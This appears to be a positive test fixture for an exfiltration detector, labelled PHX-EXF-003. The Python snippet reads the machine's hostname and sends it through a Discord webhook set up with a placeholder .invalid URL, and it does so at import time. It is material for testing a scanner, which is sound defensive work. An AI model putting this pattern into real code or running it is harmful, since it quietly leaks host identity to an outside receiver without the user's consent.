"""PHX-EXF-003 positive (ADR-028): the host's identity sent through a Discord webhook.

The receiver comes from a class-method factory, `SyncWebhook.from_url`, and the identity
travels inside an f-string. The webhook URL is under .invalid.
"""
import socket

from discord import SyncWebhook

_host = socket.gethostname()
_hook = SyncWebhook.from_url("https://discord.example.invalid/api/webhooks/1/x")
_hook.send(content=f"{_host}")
